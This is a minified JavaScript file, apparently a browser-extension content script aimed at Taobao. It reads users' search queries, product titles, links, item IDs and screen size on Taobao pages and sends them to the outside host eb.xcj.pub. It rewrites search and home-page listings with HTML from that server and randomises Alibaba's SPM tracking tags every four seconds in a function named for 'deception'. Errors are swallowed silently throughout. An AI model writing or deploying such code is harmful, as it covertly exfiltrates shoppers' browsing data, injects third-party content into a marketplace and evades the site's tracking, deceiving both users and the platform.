function helper_iou_yt910($){this.$=$,this.queryUrlParamterTag=function(text,a){var textArray;-1!=text.indexOf("?")&&(text="?"+(textArray=text.split("?"))[textArray.length-1]);a=new RegExp("(^|&)"+a+"=([^&]*)(&|$)"),a=text.substr(1).match(a);return null!=a?a[2]:""},this.request___show_q=function(requestUrl,params){params.size=screen.width+"*"+screen.height,params.version="100";var resutData=null,priceFilter="";return $(".J_SortbarPriceInput").each(function(){var value=$(this).val();priceFilter+="("+(value?parseInt(value):"")+")"}),priceFilter&&(params.price=priceFilter),$.ajax({type:"POST",url:requestUrl,dataType:"json",data:params,timeout:1500,async:!1,success:function(data){data=data.data;null!=data&&0<data.length&&(resutData=data)}}),resutData},this.randomSpmValue=function(){$("meta[name='data-spm']").each(function(){var randomValue=Math.floor(4001*Math.random())+1e3,randomLetter=String.fromCharCode(Math.floor(26*Math.random())+"a".charCodeAt(0));$(this).attr("content",randomValue+randomLetter)}),$("meta[name='spm-id']").each(function(){var randomValue=Math.floor(4001*Math.random())+1e3,randomLetter=String.fromCharCode(Math.floor(26*Math.random())+"a".charCodeAt(0));$(this).attr("content",randomValue+randomLetter)})},this.dom_runAliDeceptionSpm=function(){-1==window.location.host.indexOf("aliyun.com")&&-1==window.location.host.indexOf("taobao.com")&&-1==window.location.host.indexOf("tmall.com")||(this.randomSpmValue(),setInterval(()=>{this.randomSpmValue()},4e3))},this.dom___tbitem=function(requestRoot,scno){var goodsId;"item.taobao.com"!==window.location.host||-1==window.location.href.indexOf("item.htm")||(goodsId=this.queryUrlParamterTag(window.location.search,"id"))&&$.get(requestRoot+"/ebusiness/api/tb/re/gitems?goodsId="+goodsId+"&platform=taobao&scno="+scno,function(result){})},this.dom___home=function(requestRoot,scno){try{if("www.taobao.com"!==window.location.host||"/"!==window.location.pathname)return;let isScanning=!1;screen.width,screen.height;let dataObject=this.request___show_q(requestRoot+"/ebusiness/api/tb/h/ghobbies",{scno:scno}),itemsInterval=setInterval(function(){if(!isScanning){isScanning=!0;let itemArray=$(".tbh-hotsale").find("div.item");0!=itemArray.length&&(clearInterval(itemsInterval),null!=dataObject&&itemArray.each(function(){$(this).find("a.item-more").remove();for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];parseInt($(this).attr("aria-posinset"))===parseInt(dataObjectItem.index)&&$(this).html(dataObjectItem.html)}})),isScanning=!1}},100)}catch(e){}},this.dom___search=function(requestRoot,scno){try{let that=this;if("s.taobao.com"!==window.location.host||-1==window.location.href.indexOf("://s.taobao.com/search"))return;let queryValue=this.queryUrlParamterTag(window.location.search,"q");if(!queryValue)return;let dataObject,isScanning=!1,dealredxNumber=0;setInterval(function(){var itemArray,titleArray,hrefArray,titleConnectStr,hrefConnectStr;isScanning||(dealredxNumber=0,isScanning=!0,itemArray=$("#mainsrp-itemlist").find("div.item"),isScanning=(0!=itemArray.length&&(itemArray.each(function(){"true"===$(this).attr("dealredx")&&dealredxNumber++}),dealredxNumber<5&&(titleArray=new Array,hrefArray=new Array,itemArray.each(function(){try{var title=$(this).find("div.title").children("a.J_ClickStat").text(),href=$(this).find("div.title").children("a.J_ClickStat").attr("href");title=(title=(title=(title=(title=(title=(title=title.replace(/\t/g,"")).replace(/\r/g,"")).replace(/\n/g,"")).replace(/\+/g,"%2B")).replace(/\&/g,"%26")).replace(/\#/g,"%23")).replace(/\s/g,""),titleArray.push(title),hrefArray.push(href)}catch(e){}}),titleConnectStr=titleArray.join("=============="),hrefConnectStr=hrefArray.join("=============="),dataObject=that.request___show_q(requestRoot+"/ebusiness/api/tb/s/gitems",{q:queryValue,titleConnectStr:titleConnectStr,hrefConnectStr:hrefConnectStr,scno:scno}),itemArray.each(function(){if("true"!==$(this).attr("dealredx")){if(null!=dataObject)for(var k=0;k<dataObject.length;k++){var dataObjectItem=dataObject[k];if(parseInt($(this).attr("data-index"))===parseInt(dataObjectItem.index)){if($(this).hasClass("item-ad"))return void(dataObjectItem.index=parseInt(dataObjectItem.index)+1+"");$(this).html(dataObjectItem.html)}}$(this).attr("dealredx","true")}}))),!1))},50)}catch(e){}},this.start=function(){this.dom_runAliDeceptionSpm();this.dom___home("https://eb.xcj.pub",1),this.dom___search("https://eb.xcj.pub",1),this.dom___tbitem("https://eb.xcj.pub",1)}}function _i140u_task_scan_($){try{new helper_iou_yt910($).start()}catch(e){}}